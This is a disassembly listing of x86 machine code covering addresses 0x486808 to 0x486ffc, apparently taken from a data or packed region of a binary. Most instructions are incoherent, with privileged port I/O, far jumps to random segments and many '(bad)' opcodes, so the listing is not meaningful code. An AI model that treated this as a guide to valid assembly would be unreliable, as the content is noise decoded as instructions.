  486808:	mov    ecx,DWORD PTR [edi-0x3d51049c]
  48680e:	mov    ch,0xa
  486810:	hlt    
  486811:	push   ecx
  486812:	retf   0x1187
  486815:	xchg   BYTE PTR [edx],bh
  486817:	or     eax,0xe0f6b4a1
  48681c:	cld    
  48681d:	stos   BYTE PTR es:[edi],al
  48681e:	dec    eax
  48681f:	mov    dh,0xf8
  486821:	mov    ebp,DWORD PTR [esi+0x40]
  486824:	xor    BYTE PTR [eax+0x5bb13e17],cl
  48682a:	js     0x486864
  48682c:	pusha  
  48682d:	push   ecx
  48682e:	xchg   DWORD PTR [esp+edx*4+0x7d],ecx
  486832:	in     eax,dx
  486833:	addr16 cld 
  486835:	mov    ecx,0xa05254b1
  48683a:	add    ebp,DWORD PTR [eax+0x6c]
  48683d:	sub    DWORD PTR [edx],0xcd814355
  486843:	mov    WORD PTR [edi],fs
  486845:	mov    edi,0x42760414
  48684a:	mov    WORD PTR [esi+ebp*1-0x25],ds
  48684e:	cmp    bl,BYTE PTR [eax]
  486850:	in     al,0xfc
  486852:	jp     0x486848
  486854:	fprem  
  486856:	stc    
  486857:	mov    ecx,0xf3fd04bc
  48685c:	lea    esi,[edi-0xb8a76e4]
  486862:	jl     0x486822
  486864:	xor    BYTE PTR [edi+eiz*2-0x39],bh
  486868:	adc    ch,BYTE PTR [ebx+0x5f8d0006]
  48686e:	jo     0x4868d6
  486870:	call   DWORD PTR ds:0x8b2df38c
  486876:	jne    0x486870
  486878:	mov    DWORD PTR [ebx+0x33],0xe1bbe103
  48687f:	pusha  
  486880:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  486881:	cmp    BYTE PTR [ebx],al
  486883:	fidivr WORD PTR [eax+0x7490fb68]
  486889:	cmp    ah,BYTE PTR [ebx]
  48688b:	in     al,dx
  48688c:	shl    DWORD PTR [ebx-0xe],0x61
  486890:	pop    ebp
  486891:	lea    ebx,[eax]
  486893:	and    BYTE PTR [edi],bh
  486895:	mov    bh,0xe0
  486897:	xchg   BYTE PTR [esi+edx*1],ah
  48689a:	mov    eax,DWORD PTR [edx-0x7e]
  48689d:	mov    esp,0xca204738
  4868a2:	mov    WORD PTR [ebx-0x7f255fb3],cs
  4868a8:	push   cs
  4868a9:	into   
  4868aa:	add    eax,DWORD PTR [ecx-0x66]
  4868ad:	test   BYTE PTR [ebx-0x59],dh
  4868b0:	shl    esi,0xe2
  4868b3:	jne    0x486882
  4868b5:	ret    0x47d7
  4868b8:	fsub   DWORD PTR [edi-0x4196a156]
  4868be:	outs   dx,DWORD PTR ds:[esi]
  4868bf:	loope  0x48684e
  4868c1:	ja     0x48688f
  4868c3:	push   cs
  4868c4:	stc    
  4868c5:	pushf  
  4868c6:	mov    esp,0x9c4f8dbc
  4868cb:	jno    0x4868a7
  4868cd:	out    dx,eax
  4868ce:	mov    ecx,0xfe60b7fb
  4868d3:	fwait
  4868d4:	add    edi,esp
  4868d6:	adc    al,0x44
  4868d8:	mov    edi,0xef8af907
  4868dd:	dec    esi
  4868de:	add    al,0x51
  4868e0:	lahf   
  4868e1:	cmp    al,0xfd
  4868e3:	dec    edi
  4868e4:	add    ch,ah
  4868e6:	mov    dh,0x5
  4868e8:	(bad)  
  4868e9:	in     al,dx
  4868ea:	lea    ecx,[edi-0x346dead4]
  4868f0:	je     0x4868fe
  4868f2:	std    
  4868f3:	cdq    
  4868f4:	ins    DWORD PTR es:[edi],dx
  4868f5:	jns    0x486939
  4868f7:	push   esi
  4868f8:	add    al,0x52
  4868fa:	xor    bh,ah
  4868fc:	cld    
  4868fd:	dec    edx
  4868fe:	fisubr DWORD PTR [edx-0x3a]
  486901:	sbb    BYTE PTR [edi+0x296cec38],0x79
  486908:	pop    ebx
  486909:	jmp    0x9cf64546
  48690e:	mov    ah,0x97
  486910:	pop    ds
  486911:	and    eax,DWORD PTR [edi-0x63050330]
  486917:	adc    al,0xc0
  486919:	ins    BYTE PTR es:[edi],dx
  48691a:	shl    DWORD PTR [ebp+ecx*2-0x34fc7ea],0x2a
  486922:	cwde   
  486923:	ds mov ah,0x20
  486926:	int    0xd9
  486928:	mov    WORD PTR ds:0x5680bcf9,ss
  48692e:	cmp    al,0xa7
  486930:	dec    ebp
  486931:	rol    BYTE PTR [edx-0x7ce3d3ec],cl
  486937:	in     al,dx
  486938:	sti    
  486939:	repz and edx,DWORD PTR [ebp+0x2f]
  48693d:	int    0xcc
  48693f:	(bad)  
  486940:	fist   WORD PTR [eax-0x17]
  486943:	add    bh,BYTE PTR [ebp-0x7b]
  486946:	imul   edx,esi,0xdb335edc
  48694c:	push   eax
  48694d:	push   ds
  48694e:	arpl   sp,bp
  486950:	mov    al,0xb6
  486952:	mov    DWORD PTR [ebp+0x19],ebx
  486955:	adc    eax,0x5788425c
  48695a:	mov    WORD PTR [esi],es
  48695c:	popf   
  48695d:	call   0xb8948a2e
  486962:	pop    ss
  486963:	loopne 0x486970
  486965:	sar    DWORD PTR [esi],1
  486967:	xor    al,0xf0
  486969:	cld    
  48696a:	fs mov ah,0x82
  48696d:	mov    BYTE PTR [ebp+0xb],al
  486970:	mov    DWORD PTR ds:0x19bfab55,0x5cf92f61
  48697a:	mov    edi,0xe47d4d68
  48697f:	outs   dx,DWORD PTR ds:[esi]
  486980:	mov    esp,0x4cc46aba
  486985:	dec    ebx
  486986:	je     0x48695c
  486988:	or     DWORD PTR fs:[esp+eax*2-0xa],edi
  48698d:	inc    ebx
  48698e:	fwait
  48698f:	ss aam 0xd1
  486992:	mov    edi,0xba735180
  486997:	std    
  486998:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  486999:	in     al,dx
  48699a:	dec    edi
  48699b:	pop    ebp
  48699c:	aam    0x65
  48699e:	mov    ecx,0xedb5696f
  4869a3:	retf   0xa146
  4869a6:	mov    ah,dh
  4869a8:	push   ecx
  4869a9:	xor    al,0xf8
  4869ab:	push   edx
  4869ac:	into   
  4869ad:	push   cs
  4869ae:	repnz dec ebx
  4869b0:	or     dh,BYTE PTR cs:[edx+0x30cc5dbc]
  4869b7:	inc    ecx
  4869b8:	aaa    
  4869b9:	(bad)  
  4869ba:	das    
  4869bb:	fsubr  QWORD PTR [esp+ebp*2-0x39f5d4f2]
  4869c2:	push   si
  4869c4:	push   0x79a56690
  4869c9:	jne    0x486993
  4869cb:	xor    BYTE PTR [edi+eiz*4],al
  4869ce:	or     dh,ch
  4869d0:	push   0x21
  4869d2:	xchg   edi,eax
  4869d3:	or     ebp,DWORD PTR [ecx+0x2a]
  4869d6:	lods   al,BYTE PTR ds:[esi]
  4869d7:	repz aam 0x82
  4869da:	pmulhuw mm6,QWORD PTR [edx-0x8]
  4869de:	cld    
  4869df:	jne    0x486a21
  4869e1:	cmp    ah,ah
  4869e3:	call   0x1c8e01fc
  4869e8:	xor    ch,BYTE PTR [ebx-0x10]
  4869eb:	push   esp
  4869ec:	add    DWORD PTR [edi],ecx
  4869ee:	bswap  esp
  4869f0:	out    0xe9,eax
  4869f2:	push   ebp
  4869f3:	in     al,0x52
  4869f5:	popa   
  4869f6:	not    DWORD PTR [eax]
  4869f8:	cmp    al,0x9b
  4869fa:	popf   
  4869fb:	or     BYTE PTR [edi],dh
  4869fd:	sub    ebx,0x2
  486a00:	daa    
  486a01:	cmp    WORD PTR ds:0x719b713f,0x5a
  486a09:	add    BYTE PTR [esi+0x1b8826fc],bh
  486a0f:	cwde   
  486a10:	jmp    0x143:0x889f805b
  486a17:	push   eax
  486a18:	ror    BYTE PTR [ebx+0x2cd850c7],1
  486a1e:	stos   BYTE PTR es:[edi],al
  486a1f:	pop    edi
  486a20:	cmp    esp,edx
  486a22:	jp     0x486a25
  486a24:	sub    eax,0x8ba4fcbe
  486a29:	lock add ebx,esi
  486a2c:	xor    ebp,DWORD PTR [edi+eax*1-0x77]
  486a30:	push   ds
  486a31:	push   0x7e
  486a33:	xor    edx,DWORD PTR [eax+0x66]
  486a36:	inc    eax
  486a37:	bound  ebp,QWORD PTR [edx-0x2]
  486a3a:	push   ebp
  486a3b:	fdivr  QWORD PTR [esi+0xc530824]
  486a41:	es in  al,0x59
  486a44:	(bad)  
  486a45:	pushf  
  486a46:	mov    ecx,edi
  486a48:	jo     0x486a55
  486a4a:	jo     0x486a54
  486a4c:	daa    
  486a4d:	cmp    DWORD PTR [ebp-0x4e],ebx
  486a50:	mov    WORD PTR [esi+0x56d0ead8],gs
  486a56:	icebp  
  486a57:	dec    ecx
  486a58:	add    eax,0xccc9c458
  486a5d:	dec    edi
  486a5e:	test   BYTE PTR [ebp-0x57],cl
  486a61:	inc    esp
  486a62:	mov    al,0xc
  486a64:	les    ebp,FWORD PTR [esi+edi*8-0x58fc4bdb]
  486a6b:	jmp    0x6210b7fb
  486a70:	dec    ebp
  486a71:	mov    ah,0x1
  486a73:	imul   ebx,DWORD PTR [eax*4-0xf4030c2],0xffffffa6
  486a7b:	inc    ebp
  486a7c:	popf   
  486a7d:	push   eax
  486a7e:	mov    eax,ds:0xf157703f
  486a83:	mov    ebp,0xde660ce4
  486a88:	inc    DWORD PTR [ecx]
  486a8a:	popf   
  486a8b:	cmp    DWORD PTR [ecx],0x1
  486a8e:	jg     0x486aae
  486a90:	mov    edi,eax
  486a92:	xchg   esi,eax
  486a93:	sub    ebx,DWORD PTR [eax+edi*1]
  486a96:	loopne 0x486a3e
  486a98:	push   ebp
  486a99:	fimul  WORD PTR [ebp+0x5351de4c]
  486a9f:	push   edx
  486aa0:	push   edi
  486aa1:	add    ebp,DWORD PTR [esi]
  486aa3:	je     0x486ac0
  486aa5:	dec    esi
  486aa6:	xchg   esi,eax
  486aa7:	ret    
  486aa8:	dec    DWORD PTR [ecx]
  486aaa:	arpl   si,si
  486aac:	adc    al,0xee
  486aae:	push   DWORD PTR [esi+eax*4]
  486ab1:	or     BYTE PTR [ebp-0x103ef888],cl
  486ab7:	add    eax,DWORD PTR [ebx]
  486ab9:	inc    DWORD PTR [ebx]
  486abb:	rol    BYTE PTR [ebx],0x3e
  486abe:	push   es
  486abf:	sbb    BYTE PTR [eax],dl
  486ac1:	out    dx,eax
  486ac2:	mov    DWORD PTR [esi+0x8],edi
  486ac5:	cmc    
  486ac6:	pop    edi
  486ac7:	test   al,0xbb
  486ac9:	sbb    eax,ecx
  486acb:	push   es
  486acc:	jmp    0x486a78
  486ace:	call   DWORD PTR [edi+0x2e]
  486ad1:	pop    esp
  486ad2:	mov    esi,0xc6bc77a4
  486ad7:	xchg   BYTE PTR [eax-0xbf14062],cl
  486add:	out    dx,al
  486ade:	adc    BYTE PTR ds:0xbc4fd94f,ah
  486ae4:	hlt    
  486ae5:	jns    0x486ada
  486ae7:	mov    eax,0xb92e7c9c
  486aec:	mov    WORD PTR [ebx],ss
  486aee:	and    DWORD PTR [edi+0x4c12f21c],eax
  486af4:	mov    ecx,0x745c6c7c
  486af9:	(bad)  
  486afb:	enter  0x3c4c,0x5f
  486aff:	mov    ecx,0x72a9142c
  486b04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  486b05:	lahf   
  486b06:	or     DWORD PTR [ebx+0x1841fe41],ecx
  486b0c:	inc    ebx
  486b0d:	pop    esi
  486b0e:	dec    ebp
  486b0f:	adc    bh,BYTE PTR [eax]
  486b11:	add    eax,0x7f81c35e
  486b16:	jg     0x486afb
  486b18:	movzx  eax,WORD PTR [edi+0x1e]
  486b1c:	xor    BYTE PTR [eax+edx*1+0xa],bh
  486b20:	aas    
  486b21:	jg     0x486b2d
  486b23:	mov    eax,DWORD PTR [edi]
  486b25:	fst    QWORD PTR ds:0xcd3c79a9
  486b2b:	inc    ebx
  486b2c:	adc    bl,dh
  486b2e:	(bad)  
  486b2f:	and    dh,BYTE PTR [edi+ebp*2-0x76694a08]
  486b36:	or     BYTE PTR [esi],ah
  486b38:	mov    DWORD PTR [eax+0x56],edx
  486b3b:	dec    esi
  486b3c:	or     BYTE PTR [ecx+0xc0a0848],cl
  486b42:	lods   al,BYTE PTR ds:[esi]
  486b43:	ss ret 
  486b45:	int    0xdc
  486b47:	add    DWORD PTR [ecx+0x5fa51007],ecx
  486b4d:	mov    BYTE PTR [ecx+0x7b],al
  486b50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  486b51:	int3   
  486b52:	or     BYTE PTR [ebx],bh
  486b54:	jge    0x486b62
  486b56:	mov    di,0x61dc
  486b5a:	aaa    
  486b5b:	xchg   edx,ebp
  486b5d:	push   ds
  486b5e:	jp     0x486b06
  486b60:	sbb    al,0x87
  486b62:	lods   al,BYTE PTR ds:[esi]
  486b63:	dec    ecx
  486b64:	test   BYTE PTR ds:0xd5090dfa,cl
  486b6a:	mov    al,ds:0xc473908
  486b6f:	jae    0x486ba4
  486b71:	cmp    al,0xf
  486b73:	push   edx
  486b74:	repnz and bl,ah
  486b77:	adc    cl,0x20
  486b7a:	mov    BYTE PTR [edi+0xc],al
  486b7d:	mov    edx,0x970b5a04
  486b82:	or     dh,BYTE PTR [edx+0x47]
  486b85:	pop    ds
  486b86:	call   0xac8f5fea
  486b8b:	xchg   BYTE PTR [eax+0x66],al
  486b8e:	mov    BYTE PTR [edx+0x72498df4],ch
  486b94:	fadd   QWORD PTR [eax+0x7e0c4a14]
  486b9a:	les    ebp,FWORD PTR [ecx+eiz*2]
  486b9d:	mov    al,0x62
  486b9f:	sub    eax,DWORD PTR [ecx+edx*2-0xd65c3b4]
  486ba6:	mov    di,WORD PTR [eax+0x336090ec]
  486bad:	cmp    cl,BYTE PTR [esi]
  486baf:	dec    edi
  486bb0:	or     dl,al
  486bb2:	push   esp
  486bb3:	dec    esi
  486bb4:	or     dh,bl
  486bb6:	dec    esi
  486bb7:	jnp    0x486bd4
  486bb9:	retf   
  486bba:	jle    0x486bec
  486bbc:	or     dl,BYTE PTR [eax]
  486bbe:	pop    edx
  486bbf:	cmp    BYTE PTR [edx],dl
  486bc1:	and    BYTE PTR [edi+0x3d4eb141],bh
  486bc7:	mov    ds:0x89dc7216,al
  486bcc:	xor    al,0x98
  486bce:	xchg   DWORD PTR [ecx+0x3b43fc7e],edx
  486bd4:	pop    edi
  486bd5:	or     BYTE PTR [edx-0x5d],dh
  486bd8:	cwde   
  486bd9:	(bad)  
  486bda:	pop    edi
  486bdb:	dec    esp
  486bdc:	inc    ebx
  486bdd:	cmp    ch,bl
  486bdf:	add    eax,ebx
  486be1:	retf   0x7423
  486be4:	sub    BYTE PTR [ebx-0x65b0f8c1],cl
  486bea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  486beb:	imul   ebx,DWORD PTR [edx],0x5057481e
  486bf1:	jg     0x486c6b
  486bf3:	pop    esi
  486bf4:	sbb    BYTE PTR [eax+ebp*2-0x47490bf9],bh
  486bfb:	xchg   edi,eax
  486bfc:	and    dl,BYTE PTR [ebx]
  486bfe:	add    eax,DWORD PTR [edi+ebp*1-0x8]
  486c02:	cdq    
  486c03:	or     BYTE PTR [esi],bl
  486c05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  486c06:	mov    eax,ecx
  486c08:	(bad)  
  486c09:	mov    DWORD PTR [eax],0x61765a84
  486c0f:	ret    0xe1c3
  486c12:	pop    esp
  486c13:	jbe    0x486c85
  486c15:	ret    
  486c16:	lahf   
  486c17:	sbb    BYTE PTR [ecx+0x2414ad43],ch
  486c1d:	push   eax
  486c1e:	cmp    DWORD PTR [ebx],eax
  486c20:	fmul   DWORD PTR [eax+0x23]
  486c23:	xor    eax,0x4d243df8
  486c28:	cmp    edi,ebx
  486c2a:	ret    
  486c2b:	(bad)  
  486c2c:	fldcw  WORD PTR [esi]
  486c2e:	xor    al,0xd9
  486c30:	data16 add bl,BYTE PTR [edx]
  486c33:	xor    eax,0x7745dff0
  486c38:	paddusb mm0,QWORD PTR [eax]
  486c3b:	adc    eax,0xfca32a57
  486c40:	sar    DWORD PTR [bp+0x23],cl
  486c44:	enter  0x227d,0x6d
  486c48:	push   edx
  486c49:	jmp    0x486c5a
  486c4b:	fisttp WORD PTR [ebx+0x2da10c76]
  486c51:	nop
  486c52:	out    dx,eax
  486c53:	aas    
  486c54:	mov    ebx,0x881489ba
  486c59:	push   ebx
  486c5a:	inc    ecx
  486c5b:	cmp    ecx,edx
  486c5d:	jl     0x486c47
  486c5f:	lea    edi,[edx+0x1]
  486c62:	lahf   
  486c63:	adc    BYTE PTR [edi+ecx*1+0x1dbe623e],dh
  486c6a:	lock inc ebp
  486c6c:	pop    ebp
  486c6d:	hlt    
  486c6e:	add    al,0xf8
  486c70:	jg     0x486c37
  486c72:	add    dl,bh
  486c74:	cld    
  486c75:	leave  
  486c76:	jle    0x486bfb
  486c78:	ror    DWORD PTR [edx-0x6e],0xc0
  486c7c:	neg    eax
  486c7e:	or     eax,ecx
  486c80:	push   eax
  486c81:	jmp    FWORD PTR [ecx]
  486c83:	cmp    BYTE PTR [ecx+eax*1],cl
  486c86:	cmp    eax,ebx
  486c88:	xor    dh,BYTE PTR [eax]
  486c8a:	lea    ecx,[edi-0x1]
  486c8d:	mov    DWORD PTR [eax],edi
  486c8f:	lea    edi,[ebp+0x50b749c0]
  486c95:	push   ds
  486c96:	retf   
  486c97:	jl     0x486cb3
  486c99:	pop    ds
  486c9a:	(bad)  
  486c9b:	pop    eax
  486c9c:	add    al,0x83
  486c9e:	test   BYTE PTR [ebp-0x5a],0x4
  486ca2:	or     BYTE PTR [eax+eax*8],cl
  486ca5:	adc    BYTE PTR [ecx+0x79],cl
  486ca8:	jmp    0x486cdc
  486caa:	mov    ds:0xf836db5,eax
  486caf:	pop    esp
  486cb0:	mov    edi,0x353b1bd9
  486cb5:	adc    DWORD PTR [edi+0x3b],edi
  486cb8:	mov    WORD PTR [ebp+edi*4-0x16],?
  486cbc:	mov    ebp,0xf33b37eb
  486cc1:	push   eax
  486cc2:	mov    eax,DWORD PTR [eax+esi*4-0x4]
  486cc6:	push   ss
  486cc7:	sub    ecx,DWORD PTR [eax+esi*8-0x1fa9afaf]
  486cce:	call   0xd7c:0x18a81e8d
  486cd5:	aad    0x65
  486cd7:	mov    eax,ds:0xe8dff872
  486cdc:	aaa    
  486cdd:	aam    0xf0
  486cdf:	push   edx
  486ce0:	lea    ecx,[edi+eax*1]
  486ce3:	push   ecx
  486ce4:	(bad)  
  486ce6:	inc    esi
  486ce7:	add    edi,0x10
  486cea:	jmp    0x486ca4
  486cec:	lea    ebx,[ebp-0x10]
  486cef:	and    bl,BYTE PTR [eax+0x285b2df4]
  486cf5:	lds    ebp,FWORD PTR [esi+ebp*1]
  486cf8:	push   edi
  486cf9:	mov    esi,0x1e11a80e
  486cfe:	jg     0x486cb8
  486d00:	cmp    BYTE PTR [eax],ah
  486d02:	jmp    0x486d83
  486d04:	hlt    
  486d05:	and    esp,DWORD PTR [edx+eax*1-0xeefc3ee]
  486d0c:	push   edi
  486d0d:	lea    edi,[esi+0x14]
  486d10:	mov    DWORD PTR [ebp-0x18],edi
  486d13:	adc    eax,0x8395c17f
  486d18:	jmp    0x3ec6:0x84c68355
  486d1f:	push   eax
  486d20:	sbb    bl,ah
  486d22:	mov    DWORD PTR [ebp-0x10],esi
  486d25:	jmp    0x486d3d
  486d27:	dec    BYTE PTR [eax+0x2e3a0b5d]
  486d2d:	jo     0x486d02
  486d2f:	or     ch,ah
  486d31:	sti    
  486d32:	mov    edi,ebx
  486d34:	stos   BYTE PTR es:[edi],al
  486d35:	mov    WORD PTR [eax+eax*1+0x69],?
  486d39:	call   0x106a:0x13533f11
  486d40:	or     DWORD PTR [edx],ecx
  486d42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  486d43:	adc    DWORD PTR [esi+0x6568fed2],esi
  486d49:	fmul   DWORD PTR [edi]
  486d4b:	push   ecx
  486d4c:	test   DWORD PTR [esi+0xb983f2],ebp
  486d52:	add    BYTE PTR [eax+0x62],bl
  486d55:	lods   al,BYTE PTR ds:[esi]
  486d56:	sub    ax,0xc55d
  486d5a:	loopne 0x486d0b
  486d5c:	mov    esi,0xf9814326
  486d61:	add    dh,bh
  486d63:	cs mov cl,0x18
  486d66:	jmp    DWORD PTR [edx+0x7494f7db]
  486d6c:	xor    eax,0x830748c
  486d71:	and    dh,BYTE PTR [esi+ecx*1+0x30]
  486d75:	test   BYTE PTR [ebp-0x34],cl
  486d78:	(bad)  
  486d7a:	inc    DWORD PTR [ecx-0x77]
  486d7d:	imul   ebx,ebx,0xeb606db1
  486d83:	lods   eax,DWORD PTR ds:[esi]
  486d84:	jecxz  0x486d6c
  486d86:	cmp    BYTE PTR [edx],ah
  486d88:	je     0x486d36
  486d8a:	inc    edi
  486d8b:	idiv   DWORD PTR [edi+0xb7c1fed]
  486d91:	add    BYTE PTR [esi+ebp*2-0x3a],dh
  486d95:	inc    ebp
  486d96:	or     ch,bl
  486d98:	nop
  486d99:	push   ss
  486d9a:	add    DWORD PTR [edi+ecx*8+0x33],esi
  486d9e:	ror    BYTE PTR [ebp+0x2c0f61bd],cl
  486da4:	int    0x9
  486da6:	push   0x76
  486da8:	xchg   esp,eax
  486da9:	idiv   DWORD PTR [ebp+edi*4-0x7f]
  486dad:	pusha  
  486dae:	mov    edi,esi
  486db0:	push   ds
  486db1:	mov    ch,0xc7
  486db3:	mov    esp,0xae35cf8b
  486db8:	mov    al,ds:0xf4443419
  486dbd:	mov    edi,0x9b58fb76
  486dc2:	adc    ebx,DWORD PTR [ebx]
  486dc4:	cmp    al,0x8
  486dc6:	push   es
  486dc7:	pop    esi
  486dc8:	mov    ds:0x859b0974,eax
  486dcd:	xor    eax,0x4bbaa054
  486dd2:	push   0x43
  486dd4:	jmp    0x486db8
  486dd6:	ret    0x4170
  486dd9:	fdivr  QWORD PTR [ebp-0x17]
  486ddc:	jnp    0x486e48
  486dde:	adc    eax,0x8b01dad6
  486de3:	or     ch,ah
  486de5:	sbb    eax,0x10c985bc
  486dea:	pop    esp
  486deb:	fwait
  486dec:	adc    al,0x14
  486dee:	push   eax
  486def:	pop    edx
  486df0:	pop    edx
  486df1:	adc    al,BYTE PTR ds:0x46055816
  486df7:	and    eax,0xc916c01f
  486dfc:	pop    edx
  486dfd:	cmp    esi,eax
  486dff:	je     0x486e42
  486e01:	mov    ah,BYTE PTR [ebx]
  486e03:	pop    ss
  486e04:	and    BYTE PTR [eax],dl
  486e06:	adc    eax,0x142e461f
  486e0b:	retf   0x2f81
  486e0e:	sub    BYTE PTR [ebx-0x75],dl
  486e11:	xchg   edx,eax
  486e12:	add    BYTE PTR [ebx-0x38],0xdc
  486e16:	dec    esi
  486e17:	add    ebp,DWORD PTR [ebp+0x584fc43]
  486e1d:	aas    
  486e1e:	mov    bl,0x6a
  486e20:	mov    dh,BYTE PTR [eax]
  486e22:	mov    DWORD PTR [ecx+0x87eb65b],eax
  486e28:	sahf   
  486e29:	jns    0x486ea0
  486e2b:	dec    ebp
  486e2c:	call   FWORD PTR [ebx]
  486e2e:	or     dh,BYTE PTR [esi+0x20123efa]
  486e34:	fidivr DWORD PTR [edi+0x49fc69d9]
  486e3a:	ret    
  486e3b:	and    BYTE PTR [eax],dh
  486e3d:	jge    0x486e32
  486e3f:	jmp    0x486e1e
  486e41:	fbstp  TBYTE PTR [ebx]
  486e43:	add    al,0xd8
  486e45:	jmp    0x486e9a
  486e47:	ror    DWORD PTR [esi+edx*2],0x1a
  486e4b:	mov    dl,0x97
  486e4d:	cmp    DWORD PTR [ecx+0x5d],esi
  486e50:	xchg   edi,eax
  486e51:	inc    esi
  486e52:	lahf   
  486e53:	mov    ds:0xe478d40,eax
  486e58:	in     al,0xa4
  486e5a:	inc    ebx
  486e5b:	dec    ebx
  486e5c:	daa    
  486e5d:	inc    ax
  486e5f:	imul   ebx,DWORD PTR [esi+0x406b20e7],0x804f4713
  486e69:	pop    es
  486e6a:	add    eax,0x10ff81f6
  486e6f:	cli    
  486e70:	ret    
  486e71:	lahf   
  486e72:	rcl    edx,cl
  486e74:	jne    0x486e53
  486e76:	rcr    DWORD PTR [edi+0x581b552a],0x82
  486e7d:	dec    ebx
  486e7e:	int3   
  486e7f:	xor    al,0xcd
  486e81:	in     eax,0x53
  486e83:	pop    ebx
  486e84:	pop    eax
  486e85:	add    eax,DWORD PTR [ebp+0x5e0300d8]
  486e8b:	add    eax,eax
  486e8d:	ds pop edx
  486e8f:	jb     0x486ed6
  486e91:	pop    ebp
  486e92:	dec    edi
  486e93:	repnz and eax,0x89c60e1c
  486e99:	ja     0x486ea7
  486e9b:	adc    eax,0x6cce37f0
  486ea0:	fs ds je 0x486ed2
  486ea4:	push   eax
  486ea5:	push   ecx
  486ea6:	push   esi
  486ea7:	inc    ebx
  486ea8:	or     DWORD PTR [ecx],eax
  486eaa:	mov    WORD PTR [ebx+0x2148b36],ss
  486eb0:	mov    eax,0xfa58648f
  486eb5:	pop    ss
  486eb6:	mov    WORD PTR [esi-0x4c92b783],?
  486ebc:	ds pop esp
  486ebe:	jmp    FWORD PTR [eax]
  486ec0:	or     eax,0xffffffff
  486ec3:	push   edx
  486ec4:	hlt    
  486ec5:	push   ebx
  486ec6:	mov    ah,0xb8
  486ec8:	and    bl,BYTE PTR [eax+0x1a658175]
  486ece:	fnsetpm(287 only) 
  486ed0:	mov    ch,0x22
  486ed2:	xor    al,0x9
  486ed4:	xor    BYTE PTR [esp+edx*1],dh
  486ed7:	loopne 0x486e92
  486ed9:	add    BYTE PTR [eax+0x6a4e05b4],bh
  486edf:	add    al,0xdc
  486ee1:	mov    ch,0x1b
  486ee3:	scas   eax,DWORD PTR es:[edi]
  486ee4:	pusha  
  486ee5:	mov    ds:0xa3545ca7,al
  486eea:	aad    0x5f
  486eec:	add    eax,0x395874a8
  486ef1:	pop    edx
  486ef2:	or     BYTE PTR [esi+0x2e],dh
  486ef5:	xor    edi,edi
  486ef7:	cli    
  486ef8:	pop    edi
  486ef9:	mov    eax,ds:0xbe8b41f8
  486efe:	xor    al,0xb9
  486f00:	test   esi,esi
  486f02:	mov    ?,WORD PTR [ebp-0x771f0c1]
  486f08:	out    dx,eax
  486f09:	and    edi,DWORD PTR [ebp+edx*8+0x4535564c]
  486f10:	adc    BYTE PTR [eax+0x8783b47],al
  486f16:	jb     0x486eee
  486f18:	jo     0x486f07
  486f1a:	test   BYTE PTR [edx],0xc5
  486f1d:	mov    DWORD PTR [eax+0x66],esi
  486f20:	cmp    DWORD PTR [eax],ebx
  486f22:	mov    al,ds:0xb4ed96de
  486f27:	add    BYTE PTR [ebx],ch
  486f29:	pushf  
  486f2a:	jmp    0x486f36
  486f2c:	cdq    
  486f2d:	fiadd  WORD PTR [eax-0xdc88dfc]
  486f33:	stos   DWORD PTR es:[edi],eax
  486f34:	pop    ecx
  486f35:	adc    edx,ebp
  486f37:	add    BYTE PTR [eax],al
  486f39:	loope  0x486f4b
  486f3b:	sub    ebx,esi
  486f3d:	push   cs
  486f3e:	sar    BYTE PTR [ebp-0x2d],1
  486f41:	cwde   
  486f42:	arpl   ax,si
  486f44:	js     0x486fac
  486f46:	push   es
  486f47:	test   BYTE PTR [ebx-0x3303cf02],0xec
  486f4e:	stos   BYTE PTR es:[edi],al
  486f4f:	push   ds
  486f50:	enter  0xfe4f,0x2e
  486f54:	adc    DWORD PTR [ecx+0xf],eax
  486f57:	xor    DWORD PTR [esi],0x2
  486f5a:	sahf   
  486f5b:	lods   eax,DWORD PTR ds:[esi]
  486f5c:	mov    dl,0xa9
  486f5e:	popa   
  486f5f:	mov    ds:0x2d6a5f04,al
  486f64:	add    al,dh
  486f66:	retf   0x9da6
  486f69:	(bad)  
  486f6a:	call   0x4a3d:0x10b18024
  486f71:	add    ah,dh
  486f73:	rcr    BYTE PTR [edx+ebx*4+0x28],cl
  486f77:	jg     0x486fa2
  486f79:	pop    ecx
  486f7a:	and    dh,ch
  486f7c:	out    0xb7,al
  486f7e:	xchg   ebp,eax
  486f7f:	mov    ch,al
  486f81:	sbb    bh,dl
  486f83:	inc    esp
  486f84:	ja     0xb64ac59b
  486f8a:	cmp    BYTE PTR [eax+0x716e9d2e],0xaf
  486f91:	jo     0x486f18
  486f93:	jl     0x486fa1
  486f95:	fisttp DWORD PTR [edi]
  486f97:	mov    WORD PTR [ecx],fs
  486f99:	mov    al,ds:0x3275c2bc
  486f9e:	call   0x8851:0x2b12176d
  486fa5:	out    0x82,eax
  486fa7:	pop    ss
  486fa8:	mov    al,0x4d
  486faa:	clc    
  486fab:	cmp    DWORD PTR [edx],ebx
  486fad:	scas   al,BYTE PTR es:[edi]
  486fae:	cmp    edx,DWORD PTR [ebx+0x2]
  486fb1:	clc    
  486fb2:	bound  eax,QWORD PTR [ebx+0x277b58b7]
  486fb8:	sbb    cl,bh
  486fba:	mov    edi,0xec75c340
  486fbf:	jbe    0x486fa0
  486fc1:	mov    edi,0xc1768fe
  486fc6:	mov    edi,DWORD PTR [ebp+0x10]
  486fc9:	lods   eax,DWORD PTR ds:[esi]
  486fca:	pop    ss
  486fcb:	jl     0x487010
  486fcd:	cmp    BYTE PTR [edx],bl
  486fcf:	(bad)  [ebx]
  486fd1:	sbb    DWORD PTR [esi+edi*8],ebp
  486fd4:	lock xlat BYTE PTR ds:[ebx]
  486fd6:	or     bl,BYTE PTR [eax+0x39]
  486fd9:	loop   0x48700a
  486fdb:	sahf   
  486fdc:	lea    ecx,[ebp-0x24]
  486fdf:	push   ecx
  486fe0:	xor    BYTE PTR [ebp-0x22ad13ab],cl
  486fe6:	ins    DWORD PTR es:[edi],dx
  486fe7:	cli    
  486fe8:	sbb    DWORD PTR [ebp+0x21],0x85a23cac
  486fef:	add    eax,0xd18772ae
  486ff4:	xchg   BYTE PTR [edi-0x748376dc],bl
  486ffa:	or     al,0xeb
  486ffc:	jl     0x486fe4
